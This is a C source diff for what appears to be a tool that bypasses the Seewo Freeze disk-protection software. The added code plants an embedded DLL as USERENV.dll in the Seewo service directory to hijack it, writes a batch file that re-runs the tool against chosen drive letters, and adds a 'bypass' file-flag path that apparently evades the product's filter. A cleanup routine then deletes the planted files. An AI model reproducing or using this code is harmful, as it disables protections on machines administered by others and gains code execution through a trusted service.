@@ -2,6 +2,8 @@
 
 WCHAR configFilePath[] = L"C:\\ProgramData\\SeewoFreezeKernelConfig\\VolumeInfo.config";
 WCHAR redirectFilePath[] = L"C:\\ProgramData\\SeewoFreezeKernelConfig\\redirect.config";
+WCHAR dllFilePath[] = L"C:\\Program Files (x86)\\Seewo\\SeewoService\\SeewoHugoLauncher_installVer\\USERENV.dll";
+WCHAR cmdFilePath[] = L"C:\\Program Files (x86)\\Seewo\\SeewoService\\SeewoHugoLauncher_installVer\\cmd.bat";
 BYTE config[1024] = { 0 };
 DWORD64 startSector = 0;
 DWORD64 byteOffset = 0;
@@ -21,7 +23,7 @@ BOOLEAN GenerateFreezeConfig(DWORD volumeProtected) {
 	}
 
 	printf("[*] Generating config file...\n");
-	HANDLE hFile = CreateFile(configFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFile(configFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		printf("[-] Failed to open config file for reading.\n");
 		return FALSE;
@@ -55,7 +57,7 @@ BOOLEAN GenerateFreezeConfig(DWORD volumeProtected) {
 }
 
 BOOLEAN GetConfigFileSectorInfo() {
-	HANDLE hFile = CreateFileW(configFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE hFile = CreateFileW(configFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		return 1;
 	}
@@ -96,8 +98,8 @@ BOOLEAN GetConfigFileSectorInfo() {
 	return 0;
 }
 
-BOOLEAN WriteConfigFile() {
-	HANDLE hFile = CreateFile(configFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+BOOLEAN WriteConfigFile(BOOLEAN bypass) {
+	HANDLE hFile = CreateFile(configFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, bypass ? FILE_FLAG_SEQUENTIAL_SCAN : FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		return FALSE;
 	}
@@ -122,5 +124,72 @@ BOOLEAN InitRedirectFile() {
 		return FALSE;
 	}
 	CloseHandle(hFile);
+	return TRUE;
+}
+
+BOOLEAN InitDllFile(DWORD volume) {
+	HANDLE hDllFile = CreateFile(dllFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE) {
+		printf("[-] Failed to create dll file.");
+		return FALSE;
+	}
+
+	DWORD bytesWritten = 0;
+	if (!WriteFile(hDllFile, raw_dll, sizeof(raw_dll), &bytesWritten, NULL) || bytesWritten != sizeof(raw_dll)) {
+		CloseHandle(hDllFile);
+		printf("[-] Fail to write dll file.\n");
+		return FALSE;
+	}
+	CloseHandle(hDllFile);
+
+	HANDLE hCmdFile = CreateFile(cmdFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hCmdFile == INVALID_HANDLE_VALUE) {
+		printf("[-] Failed to create cmdline file");
+		return FALSE;
+	}
+
+	CHAR cmdline[MAX_PATH + 5 + 26 * 2 * sizeof(CHAR) + 1] = { 0 };
+	PCHAR ptr = cmdline;
+
+	DWORD pathLen = GetModuleFileNameA(NULL, cmdline, sizeof(cmdline));
+	ptr += pathLen;
+	if (pathLen == 0) {
+		printf("[-] Failed to get file path.");
+		return FALSE;
+	}
+
+	RtlCopyMemory(ptr, " flt ", 5);
+	ptr += 5;
+
+	for (int i = 0; i < 26; i++) {
+		if (volume & 1llu << i) {
+			*ptr = 'A' + i;
+			ptr++;
+			*ptr = ' ';
+			ptr++;
+		}
+	}
+	*ptr = '\x00';
+
+	bytesWritten = 0;
+	if (!WriteFile(hCmdFile, cmdline, sizeof(cmdline), &bytesWritten, NULL) || bytesWritten != sizeof(cmdline)) {
+		CloseHandle(hCmdFile);
+		printf("[-] Fail to write cmdline file.\n");
+		return FALSE;
+	}
+	CloseHandle(hCmdFile);
+
+	return TRUE;
+}
+
+BOOLEAN DeleteDllFile() {
+	if (!DeleteFile(dllFilePath)) {
+		return FALSE;
+	}
+
+	if (!DeleteFile(cmdFilePath)) {
+		return FALSE;
+	}
+
 	return TRUE;
 }
